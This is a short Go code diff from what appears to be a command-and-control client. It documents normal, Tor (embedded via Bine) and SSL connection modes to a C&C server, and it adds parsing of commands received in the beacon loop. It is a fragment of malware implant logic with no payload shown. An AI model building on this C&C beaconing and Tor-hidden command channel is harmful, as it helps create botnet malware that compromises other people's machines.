@@ -8,9 +8,15 @@ import (
 )
 
 const (
+	// Use normal HTTP connection when connecting C&C.
 	CONNECTION_NORMAL = 0
-	CONNECTION_TOR    = 1
-	CONNECTION_SSL    = 2
+
+	// Use Tor secured HTTP connection when connecting C&C.
+	// It will use embedded Tor with Bine package.
+	CONNECTION_TOR = 1
+
+	// Use SSL encrypted HTTP connection when connecting C&C.
+	CONNECTION_SSL = 2
 )
 
 type Handler struct {
@@ -85,6 +91,7 @@ func (h *Handler) Start(maxErrorCount int) error {
 		}
 		defer resp.Body.Close()
 
+		h.parseReceivedCommand(resp.Body)
 	sleepForInterval:
 		time.Sleep(time.Second * time.Duration(h.Interval))
 	}
